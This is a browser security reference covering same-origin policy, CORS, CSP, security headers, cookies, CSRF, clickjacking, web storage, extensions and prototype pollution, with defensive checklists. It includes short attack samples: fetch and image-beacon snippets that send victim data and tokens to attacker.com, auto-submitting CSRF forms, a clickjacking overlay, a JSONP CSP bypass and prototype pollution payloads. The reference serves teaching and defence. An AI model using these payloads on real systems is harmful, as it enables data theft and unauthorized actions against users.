# Browser Security Reference

A comprehensive reference for browser security architecture, web security policies, attack techniques, and defensive configurations for security practitioners, developers, and penetration testers.

---

## Table of Contents

1. [Browser Security Architecture](#1-browser-security-architecture)
2. [Same-Origin Policy (SOP)](#2-same-origin-policy-sop)
3. [CORS (Cross-Origin Resource Sharing)](#3-cors-cross-origin-resource-sharing)
4. [Content Security Policy (CSP)](#4-content-security-policy-csp)
5. [Security Headers Reference](#5-security-headers-reference)
6. [Cookie Security](#6-cookie-security)
7. [Cross-Site Request Forgery (CSRF)](#7-cross-site-request-forgery-csrf)
8. [Clickjacking](#8-clickjacking)
9. [Web Storage Security](#9-web-storage-security)
10. [Browser Extension Security](#10-browser-extension-security)
11. [Browser Exploitation](#11-browser-exploitation)
12. [Browser Security Configuration Checklist](#12-browser-security-configuration-checklist)
13. [Prototype Pollution](#13-prototype-pollution)

---

## 1. Browser Security Architecture

Modern browsers use a multi-process architecture to isolate content and limit the blast radius of compromise.

### Process Model

- **Browser process**: trusted, runs as the user, orchestrates all other processes.
- **Renderer process**: one per site (post-site-isolation); sandboxed with limited syscall access.
- **GPU process**: handles compositing and graphics; sandboxed.
- **Network process**: handles HTTP/TLS/DNS; isolated from renderer.
- **Plugin processes**: PPAPI — effectively EOL.
- **Utility processes**: audio, storage, etc.

### Sandboxing

Renderer processes operate inside a sandbox with severely restricted syscall access — no direct kernel or file system access.

- **Linux:** Seccomp-BPF filters + Linux namespaces
- **Windows:** Restricted tokens + job objects + LPAC integrity level
- **macOS:** Seatbelt sandbox profiles + hardened runtime

Renderer-to-browser communication uses IPC (Inter-Process Communication) over pipes. The renderer requests privileged operations from the browser process. This IPC boundary is the attack surface for sandbox escapes.

### Site Isolation (post-Spectre mitigation)

- Introduced broadly after the Spectre/Meltdown disclosure (2018).
- Each origin (scheme + host + port) gets its own renderer process.
- Prevents a malicious page from reading memory belonging to another site renderer.
- Chrome: enabled by default since Chrome 67 (desktop), Chrome 77 (Android).
- Firefox: Fission project, rolled out incrementally since Firefox 94.

### Rendering Engines

| Engine | Browser(s) | JS Engine | Notes |
|--------|-----------|-----------|-------|
| Blink | Chrome, Edge, Opera, Brave | V8 | Forked from WebKit in 2013 |
| Gecko | Firefox | SpiderMonkey | Mozilla-developed |
| WebKit | Safari, iOS browsers | JavaScriptCore | All iOS browsers must use WebKit per App Store policy |

### Content Process Privilege

Renderer processes have minimal privilege by design: no direct file system access, no raw socket access, no direct GPU memory access, and a limited IPC surface to the browser process.

---

## 2. Same-Origin Policy (SOP)

The Same-Origin Policy is the cornerstone of browser security. It prevents scripts from one origin from reading resources belonging to a different origin.

### Origin Definition

**Origin = Scheme + Host + Port**

All three components must be identical for two URLs to share the same origin.

### Origin Comparison Examples

| URL A | URL B | Same Origin? | Reason |
|-------|-------|-------------|--------|
| `https://app.com/page1` | `https://app.com/page2` | Yes | Path does not matter |
| `https://app.com` | `http://app.com` | No | Scheme differs |
| `https://app.com` | `https://app.com:8080` | No | Port differs |
| `https://app.com` | `https://evil.com` | No | Host differs |
| `https://app.com` | `https://sub.app.com` | No | Subdomain = different host |
| `https://app.com:443` | `https://app.com` | Yes | Port 443 is implicit for HTTPS |

### What SOP Restricts

- Reading responses from cross-origin XHR/fetch requests
- Accessing the DOM of a cross-origin document (e.g., iframe)
- Reading cookies set by another origin
- Accessing localStorage/sessionStorage of another origin
- Calling most methods on a cross-origin Window or Location object

### What SOP Does NOT Prevent

- **Loading** cross-origin resources: `<img>`, `<script>`, `<link>`, `<iframe>`, `<video>`
- **Writing** to cross-origin via form submissions or link navigations
- Cross-origin redirects (browser follows, script cannot read the destination response)
- `window.postMessage` (intentional opt-in relaxation)

### window.postMessage

A controlled mechanism to send messages across origins. The receiver MUST validate `event.origin`:

```javascript
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-sender.com') return;
  console.log(event.data);
});
```

Failure to validate `event.origin` is a commonly exploited vulnerability that allows cross-origin data exfiltration.

---

## 3. CORS (Cross-Origin Resource Sharing)

CORS is the W3C mechanism allowing servers to explicitly opt-in to relaxing SOP for specific cross-origin requests.

### How CORS Works

1. Browser adds `Origin: https://requester.com` header to cross-origin request.
2. Server responds with `Access-Control-Allow-Origin`.
3. Browser checks if ACAO matches the requester origin — if yes, JavaScript can read the response.

### Simple vs Preflighted Requests

**Simple requests** (no preflight) require: GET/POST/HEAD method, only safe headers, no custom headers.

**Preflighted requests** trigger an OPTIONS request first when: non-safe method is used, custom headers like Authorization are present, or Content-Type is application/json.

### CORS Response Headers

```
Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### CORS Misconfigurations

**Origin Reflection (Critical):** Server copies the Origin header directly into ACAO. Any attacker origin is permitted.

**Null Origin Allowed:** `Access-Control-Allow-Origin: null` — sandboxed iframes send `Origin: null`, attackers exploit this.

**Prefix/Suffix Match Bypass:** Regex `^https://.*\.app\.com$` allows `https://evil.app.com`.

**Wildcard + Credentials:** Combining `ACAO: *` with `Allow-Credentials: true` is spec-invalid but some implementations attempt it.

### CORS Exploitation Proof of Concept

```javascript
// Exploit: CORS origin reflection with credentials
fetch('https://api.victim.com/user/data', {
  credentials: 'include'
}).then(r => r.text()).then(data => {
  fetch('https://attacker.com/steal?d=' + btoa(data));
});
```

### Testing CORS Misconfiguration

```bash
curl -H "Origin: https://evil.com" -I https://api.target.com/endpoint
curl -H "Origin: null" -I https://api.target.com/endpoint
# Look for: Access-Control-Allow-Origin: https://evil.com
# Combined with: Access-Control-Allow-Credentials: true
```

---

## 4. Content Security Policy (CSP)

CSP is an HTTP response header (or meta tag) instructing browsers to restrict what resources can be loaded and executed on a page.

### Core Directives

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com 'nonce-RANDOM123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-src 'none';
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-uri https://csp-report.example.com/report;
```

### Nonce-Based CSP (Most Secure)

Server generates a cryptographically random nonce per request: `Content-Security-Policy: script-src 'nonce-rAnd0mV4lu3=='`

Scripts without the matching nonce are blocked. This is the most practical XSS mitigation approach.

### Hash-Based CSP

`Content-Security-Policy: script-src 'sha256-HASH_OF_SCRIPT_CONTENT='`

Any modification to the script content (even whitespace) invalidates the hash.

### CSP Bypass Techniques

| Bypass | Condition |
|--------|-----------|
| JSONP endpoint abuse | `script-src *.trusted.com` and trusted.com has a JSONP endpoint |
| AngularJS template injection | angular.js loaded from an allowed CDN |
| Script gadgets | Existing allowed JS reused for arbitrary code execution |
| `unsafe-inline` present | XSS fully operational |
| `unsafe-eval` present | eval(), Function(), setTimeout(string) enabled |
| Missing `object-src 'none'` | Legacy plugin execution possible |
| Missing `base-uri 'self'` | Base tag injection redirects relative URLs to attacker domain |

**JSONP bypass example:** If `script-src *.trusted.com` and `trusted.com/jsonp?callback=` exists, loading `https://trusted.com/jsonp?callback=alert(document.cookie)` executes as code.

### CSP Strength Comparison

| CSP Configuration | Strength |
|------------------|----------|
| `script-src 'unsafe-inline'` | Very Weak — XSS fully enabled |
| `script-src https:` | Weak — any HTTPS script allowed |
| `default-src 'self'` | Medium |
| `script-src 'nonce-X'` | Strong |
| `default-src 'none'; script-src 'nonce-X'; base-uri 'self'` | Strongest |

Tools: CSP Evaluator (https://csp-evaluator.withgoogle.com/), Report-Only mode for gradual rollout.

---

## 5. Security Headers Reference

### HTTP Strict Transport Security (HSTS)

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000` — forces HTTPS for 1 year
- `includeSubDomains` — applies policy to all subdomains
- `preload` — submit to https://hstspreload.org/ for browser hardcoding
- Only effective when delivered over HTTPS (HTTP responses ignore HSTS)

HSTS bypass scenarios: first visit before HSTS in place (Trust On First Use); subdomain takeover bypasses `includeSubDomains`; HSTS stripping via captive portals.

### X-Frame-Options (Legacy)

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

Superseded by CSP `frame-ancestors`. Use CSP for new deployments.

### X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

Prevents MIME sniffing — browser honors declared Content-Type exactly. Without it, a file served as `text/plain` could be re-interpreted as JavaScript.

### Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
```

| Value | Behavior |
|-------|----------|
| `no-referrer` | Never send Referer header |
| `origin` | Send only origin (no path/query) |
| `strict-origin` | Send origin on same-scheme only |
| `strict-origin-when-cross-origin` | Full URL same-origin; origin only cross-origin |
| `unsafe-url` | Always send full URL — leaks sensitive paths to third parties |

### Permissions-Policy

```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()
```

Controls browser API and hardware feature access. Empty `()` denies all origins including self.

### Cross-Origin-Opener-Policy (COOP)

```
Cross-Origin-Opener-Policy: same-origin
```

Isolates the browsing context group. Required (with COEP) for SharedArrayBuffer. Mitigates XS-Leaks and Spectre timing attacks via high-resolution timers.

### Cross-Origin-Embedder-Policy (COEP)

```
Cross-Origin-Embedder-Policy: require-corp
```

Prevents loading cross-origin resources that do not explicitly opt-in via CORP or CORS headers. Required with COOP for SharedArrayBuffer.

### Cross-Origin-Resource-Policy (CORP)

```
Cross-Origin-Resource-Policy: same-origin
```

| Value | Effect |
|-------|--------|
| `same-origin` | Only same-origin pages can read this resource |
| `same-site` | Same-site pages can read |
| `cross-origin` | Any origin can read (for public CDN assets) |

Testing tools: https://securityheaders.com, https://observatory.mozilla.org, Chrome DevTools Lighthouse Audits.

---

## 6. Cookie Security

### Cookie Attributes Reference

```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Domain=example.com; Max-Age=3600;
```

| Attribute | Effect | Security Purpose |
|-----------|--------|-----------------|
| `Secure` | HTTPS only | Prevents transmission over plain HTTP |
| `HttpOnly` | No JS access | Blocks XSS-based cookie theft via document.cookie |
| `SameSite=Strict` | Same-site requests only | Strong CSRF protection |
| `SameSite=Lax` | Safe methods cross-site | Moderate CSRF protection (browser default since 2020) |
| `SameSite=None` | Cross-site allowed | Requires `Secure`; needed for third-party contexts |
| `Domain=example.com` | Includes all subdomains | Broader scope |
| `Max-Age` | Expiry in seconds | Limits session persistence |

### SameSite Deep Dive

- **`Strict`**: Cookie only sent on same-site navigations. Breaks OAuth flows and email magic links.
- **`Lax`** (Chrome/Firefox default since 2020): Sent on top-level GET navigations. Blocks most CSRF.
- **`None`**: Sent cross-site. Requires `Secure`. Needed for third-party embeds, OAuth on separate domains.

### Cookie Prefixes

**`__Host-` prefix (strongest):** Browser enforces `Secure` required, no `Domain` attribute, `Path=/` required. Prevents subdomain attacks.

```
Set-Cookie: __Host-session=abc123; Secure; Path=/; HttpOnly
```

**`__Secure-` prefix:** Browser enforces `Secure` attribute must be present.

```
Set-Cookie: __Secure-token=abc123; Secure; Domain=example.com
```

### Session Token Storage Comparison

| Storage | XSS Risk | Auto-Sent to Server | Expiry | CSRF Risk |
|---------|----------|-------------------|--------|-----------|
| Cookie (HttpOnly+Secure+SameSite) | None | Yes | Controlled | Mitigated |
| Cookie (no HttpOnly) | Yes | Yes | Controlled | Yes |
| localStorage | Yes | No | Never | No |
| sessionStorage | Yes | No | Tab close | No |
| IndexedDB | Yes | No | Never | No |

**Best practice**: Store session tokens in `HttpOnly; Secure; SameSite=Lax` cookies — never in localStorage.

---

## 7. Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user browser into making unintended requests to a target application.

### Pre-Conditions for CSRF

1. Cookie-based session exists (browser sends it automatically).
2. Target action has side effects (state change, fund transfer).
3. Server does not adequately validate request origin.

### Classic POST CSRF

```html
<!-- Hosted on attacker.com; victim visits while logged into bank.com -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="amount" value="10000">
      <input type="hidden" name="toAccount" value="attacker-account">
    </form>
  </body>
</html>
```

### GET-Based CSRF

```html
<img src="https://bank.com/transfer?amount=10000&to=attacker" style="display:none">
```

### CSRF Defenses

**1. CSRF Tokens (Synchronizer Token Pattern)**

Server-generated secret per session, included in every state-changing form and validated server-side.

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="server-generated-unpredictable">
</form>
```

**2. SameSite Cookies:** `SameSite=Strict` eliminates CSRF entirely. `SameSite=Lax` blocks POST CSRF and is the browser default.

**3. Double-Submit Cookie Pattern:** Set a random token in a cookie AND require the same value in a request header/parameter. Attacker cannot read the cookie to forge the match.

**4. Custom Request Headers:** Require `X-Requested-With: XMLHttpRequest` on all AJAX state-changing calls. Cross-site requests cannot set custom headers without triggering CORS preflight.

**5. Origin/Referer Validation:**
```python
allowed_origins = {'https://app.example.com'}
origin = request.headers.get('Origin')
if origin not in allowed_origins:
    abort(403, 'CSRF protection: invalid origin')
```

**6. Re-authentication for Critical Actions:** Require password or MFA for high-impact operations.

### CSRF Bypass Techniques

- Remove token parameter entirely — some servers only validate if token is present
- Subdomain XSS to exfiltrate token, then forge request from that origin
- JSON body with wrong Content-Type if server accepts text/plain as JSON

---

## 8. Clickjacking

Clickjacking uses invisible iframes to trick users into clicking UI elements they cannot see.

### Attack Mechanism

```html
<style>
  #hidden-frame {
    opacity: 0.00001;
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 999;
  }
</style>
<iframe id="hidden-frame" src="https://victim.com/settings/delete-account"></iframe>
<button style="position:absolute;top:200px;left:300px;z-index:1">Click for a free prize!</button>
```

### Variants

- **UI Redressing**: Transparent overlays over target buttons.
- **Cursorjacking**: Replace cursor image to offset the apparent click position.
- **Multi-step clickjacking**: Series of clicks completing a multi-step confirmation flow.

### Defenses

**CSP `frame-ancestors` (preferred):**
```
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com
```

**X-Frame-Options (legacy):**
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

Frame-busting JavaScript is a weak defense — easily bypassed by `<iframe sandbox="allow-scripts">` which prevents top-navigation.

---

## 9. Web Storage Security

### Storage Types Overview

| Storage | Capacity | Persistence | JS Accessible | Same-Origin Enforced |
|---------|---------|-------------|--------------|----------------------|
| Cookie | ~4KB | Configurable | Yes (unless HttpOnly) | Yes |
| localStorage | 5-10MB | Permanent | Yes | Yes |
| sessionStorage | 5-10MB | Tab/session | Yes | Yes |
| IndexedDB | 50MB+ | Permanent | Yes | Yes |
| Cache API | Large | Persistent | Via ServiceWorker | Yes |

### Security Risks

All JavaScript-accessible storage is reachable via XSS. Any data stored there is exposed if an XSS vulnerability exists on the page.

XSS payload exfiltrating localStorage:
```javascript
var token = localStorage.getItem('auth_token');
var img = new Image();
img.src = 'https://attacker.com/steal?t=' + encodeURIComponent(token);
```

### Best Practices

1. Never store session tokens or credentials in localStorage or sessionStorage.
2. Store authentication tokens only in `HttpOnly; Secure; SameSite` cookies.
3. Use sessionStorage only for non-sensitive, tab-scoped UI state.
4. Implement strict CSP to limit XSS attack surface.
5. Do not cache sensitive API responses in the Service Worker Cache API.

---

## 10. Browser Extension Security

### Extension Architecture

| Component | Privilege | Purpose |
|-----------|-----------|---------|
| manifest.json | N/A | Declares all permissions |
| background.js / service_worker | High | Persistent privileged context |
| content_scripts | Medium | Injected into web pages |
| popup | Low | Browser action UI |
| options | Low | Settings page |

### High-Risk Permissions

| Permission | Risk |
|-----------|------|
| `<all_urls>` | Inject scripts into any website |
| `webRequest` / `webRequestBlocking` | Intercept and modify all HTTP traffic |
| `cookies` | Read/write cookies for any domain |
| `tabs` | Access URL and title of all open tabs |
| `history` | Full browsing history access |
| `nativeMessaging` | Communicate with native apps — proxy to full OS access |

### Attack Scenarios

**Malicious extension from the store:** Published as a legitimate utility. Contains hidden credential harvesting, keylogging, or session token exfiltration.

**Supply chain compromise:** Legitimate extension developer account compromised. Malicious update pushed automatically to all users.

Real incidents:
- **The Great Suspender** (Chrome, 2021): Popular tab manager acquired by unknown party, malicious code added.
- **DataSpii** (2019): Eight extensions harvested sensitive URLs (password reset tokens, session IDs) from millions of users across major corporations.

### Enterprise Controls

**Chrome Enterprise policy:**
```json
{
  "ExtensionInstallAllowlist": ["allowed_extension_id"],
  "ExtensionInstallBlocklist": ["*"],
  "ExtensionInstallForcelist": ["required_extension_id;update_url"]
}
```

**Firefox Enterprise policy (policies.json):**
```json
{
  "policies": {
    "ExtensionSettings": {
      "*": { "installation_mode": "blocked" },
      "approved@company.org": { "installation_mode": "allowed_and_removable" }
    }
  }
}
```

### Extension Analysis Methodology

1. Download `.crx` file (ZIP format) and extract contents.
2. Review `manifest.json` — check `permissions`, `host_permissions`, `content_scripts`.
3. Audit background scripts for external network requests and form submission listeners.
4. Monitor network traffic while extension is active using DevTools Network tab.
5. Tools: CRXcavator (https://crxcavator.io/), tarnish (Mandiant), Chrome Extension Source Viewer.

---

## 11. Browser Exploitation

### Exploit Chain Overview

Browser exploitation follows a two-stage chain:
1. **Renderer exploit**: Achieve remote code execution within the sandboxed renderer process.
2. **Sandbox escape**: Escalate from renderer sandbox to browser process or OS level.

### Common Vulnerability Classes

| Class | Description | Location |
|-------|-------------|----------|
| Type confusion | Object treated as wrong type after JIT compiler optimization | JS Engine |
| Use-after-free (UAF) | Memory accessed after deallocation or garbage collection | JS Engine, DOM |
| Out-of-bounds (OOB) | Array or buffer bounds not properly enforced | JS Engine, WebGL |
| Integer overflow | Arithmetic overflow in size/length calculations | Layout engine |
| Race condition | TOCTOU bugs in async rendering pipeline | Renderer |
| Heap spray | Fill heap with shellcode to improve exploit reliability | Exploitation technique |

### Notable CVEs

| CVE | Year | Component | Type | Exploited In-Wild |
|-----|------|-----------|------|------------------|
| CVE-2021-30551 | 2021 | V8 (Chrome) | Type confusion | Yes — APT campaigns |
| CVE-2023-4863 | 2023 | WebP (all browsers) | Heap buffer overflow | Yes — NSO Group |
| CVE-2024-0519 | 2024 | V8 (Chrome) | OOB memory access | Yes — targeted attacks |
| CVE-2021-1879 | 2021 | WebKit (Safari/iOS) | Use-after-free | Yes — iOS targeting |

### Exploit Delivery Methods

- **Watering hole attacks**: Compromise legitimate websites visited by target organizations.
- **Spear-phishing**: Link to exploit server in targeted email.
- **Malvertising**: Embed exploit kit in ad networks for mass delivery.
- **Drive-by download**: No user interaction beyond visiting the page.

### Browser Security Defenses

- Enable automatic browser updates — patch window for 0-days is critical.
- Never use `--no-sandbox` in production — disables all sandboxing.
- V8 Sandbox (Chrome 123+): Additional memory isolation within the V8 heap.
- Site isolation: Default in Chrome 67+ and Firefox 94+ (Fission).
- MiraclePtr (Chrome): Mitigates use-after-free exploits in the browser process.
- Safe Browsing Enhanced Protection: Real-time checks against malware and phishing.

### Red Team Browser Attack Tools

| Tool | Purpose |
|------|---------|
| BeEF (Browser Exploitation Framework) | Browser hooking and post-XSS attack delivery |
| Metasploit browser modules | Exploit staging and delivery |
| XSSHunter Pro | Blind XSS payload management and callbacks |
| Caido | HTTP proxy for manual browser security testing |
| Burp Suite Pro | Intercept, replay, scan web and browser traffic |

---

## 12. Browser Security Configuration Checklist

### Enterprise Browser Policy

```
[ ] Force automatic browser updates — no more than 1 major version behind
[ ] Block unauthorized extension installation via MDM/Group Policy
[ ] Allow-list only vetted, business-required extensions
[ ] Enable Safe Browsing Enhanced Protection or equivalent
[ ] Disable saved-password sync to personal accounts in managed browsers
[ ] Block PPAPI plugins (Flash/Java — EOL and active attack surface)
[ ] Enable DNS-over-HTTPS via managed browser policy
[ ] Configure certificate transparency enforcement
[ ] Enable FIDO2/hardware security key support
[ ] Disable developer mode in production user profiles
[ ] Enable Strict Site Isolation policy
```

### Application Security Headers

```
[ ] Content-Security-Policy: nonce or hash; avoid unsafe-inline in script-src
[ ] Content-Security-Policy: object-src 'none' and base-uri 'self'
[ ] Content-Security-Policy: frame-ancestors 'none' or 'self'
[ ] Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
[ ] X-Content-Type-Options: nosniff
[ ] Referrer-Policy: strict-origin-when-cross-origin
[ ] Permissions-Policy: camera=(), microphone=(), geolocation=()
[ ] Cross-Origin-Opener-Policy: same-origin
[ ] Cross-Origin-Embedder-Policy: require-corp
[ ] Cross-Origin-Resource-Policy: same-origin (for authenticated resources)
[ ] X-Frame-Options: DENY (legacy; prefer CSP frame-ancestors)
[ ] Remove X-Powered-By, Server, X-AspNet-Version headers
```

### CORS Configuration

```
[ ] Never reflect Origin header without explicit allowlist validation
[ ] Never allow Access-Control-Allow-Origin: null in production
[ ] Validate origin against an explicit allowlist (not regex suffix/prefix match)
[ ] Do not combine ACAO: * with Allow-Credentials: true
[ ] Scope CORS headers only to endpoints requiring cross-origin access
[ ] Log and alert on unexpected Origin header values
```

### Cookie Configuration

```
[ ] All session cookies: Secure + HttpOnly + SameSite=Lax minimum
[ ] SameSite=None only where required with documented justification
[ ] Use __Host- prefix for highest-security session cookies
[ ] No sensitive data in localStorage or sessionStorage
[ ] Set appropriate Max-Age/Expires — avoid indefinite session cookies
[ ] Audit and eliminate unnecessary third-party cookies
```

### CSRF Protection

```
[ ] CSRF tokens on all state-changing forms and API endpoints
[ ] Validate CSRF token server-side — reject missing or mismatched tokens
[ ] SameSite=Lax or Strict on session cookies as additional layer
[ ] Custom request header (X-Requested-With) on AJAX state-changing calls
[ ] Origin/Referer validation as defense-in-depth
[ ] Re-authentication for high-impact operations
```

### CSP Maturity Levels

```
Level 1 — Basic:    default-src 'self'; object-src 'none'
Level 2 — Better:   + script-src 'nonce-X'; restrict style-src
Level 3 — Strong:   + base-uri 'self'; frame-ancestors 'none'; form-action 'self'
Level 4 — Best:     + report-uri/report-to; COOP + COEP headers; no unsafe-inline anywhere
```

---

## 13. Prototype Pollution

### JavaScript Prototype Chain Background

Every JavaScript object inherits from `Object.prototype`. Properties added to it become available on all objects.

```javascript
const obj = {};
// obj.__proto__ === Object.prototype   → true
// Object.prototype.isAdmin             → undefined (initially)
```

### The Vulnerability

If attacker-controlled input flows into an unsafe object merge function, `Object.prototype` can be modified. All objects then inherit the polluted properties.

### Vulnerable Code Pattern

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];  // VULNERABLE: no key validation
    }
  }
}

const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

console.log({}.isAdmin);   // true — Object.prototype polluted
console.log([].isAdmin);   // true — all objects affected
```

### Constructor Pollution

```javascript
const payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
merge({}, payload);
console.log({}.isAdmin);  // true
```

### Impact Scenarios

**Privilege escalation:** `if (user.isAdmin) { grantAccess(); }` — polluting `isAdmin` bypasses authorization for every user.

**Denial of service:** Polluting `toString` or `valueOf` breaks JSON serialization and string operations application-wide.

**Remote code execution (Node.js):** Prototype pollution of process spawn options can trigger RCE when passed to child_process functions.

### Vulnerable Libraries (Historical)

| Library | CVE | Fixed Version |
|---------|-----|--------------|
| lodash `_.merge` | CVE-2019-10744 | 4.17.13 |
| jQuery `$.extend` | CVE-2019-11358 | 3.4.0 |
| minimist | CVE-2020-7598 | 1.2.3 |
| hoek | CVE-2018-3728 | 5.0.3 |
| handlebars | CVE-2019-19919 | 4.5.3 |

### Defenses

**Use `Object.create(null)` for untrusted key maps:**
```javascript
const safeMap = Object.create(null);  // No prototype chain
```

**Use `Map` for attacker-controlled keys:**
```javascript
const config = new Map();  // Keys do not interact with prototype chain
```

**Block dangerous keys in merge functions:**
```javascript
function safeMerge(target, source) {
  const blocked = new Set(['__proto__', 'constructor', 'prototype']);
  for (const key of Object.keys(source)) {
    if (blocked.has(key)) continue;
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
```

**Freeze `Object.prototype`:**
```javascript
Object.freeze(Object.prototype);
```

**Use safe property checks:**
```javascript
Object.prototype.hasOwnProperty.call(obj, 'key');
Object.hasOwn(obj, 'key');  // ES2022+
```

**JSON Schema validation:** Reject input containing `__proto__`, `constructor`, or `prototype` as keys at input boundaries.

---

## References and Further Reading

| Resource | URL |
|----------|-----|
| OWASP Browser Security Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Browser_Security_Cheat_Sheet.html |
| OWASP CSRF Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html |
| OWASP Clickjacking Defense | https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html |
| CSP Evaluator (Google) | https://csp-evaluator.withgoogle.com/ |
| Security Headers Scanner | https://securityheaders.com |
| Mozilla Observatory | https://observatory.mozilla.org |
| HSTS Preload List | https://hstspreload.org |
| MDN Web Docs — HTTP Security | https://developer.mozilla.org/en-US/docs/Web/HTTP |
| PortSwigger Web Security Academy | https://portswigger.net/web-security |
| CRXcavator Extension Analysis | https://crxcavator.io/ |
| Chromium Security Architecture | https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-architecture.md |
| Prototype Pollution Research | https://github.com/BlackFan/client-side-prototype-pollution |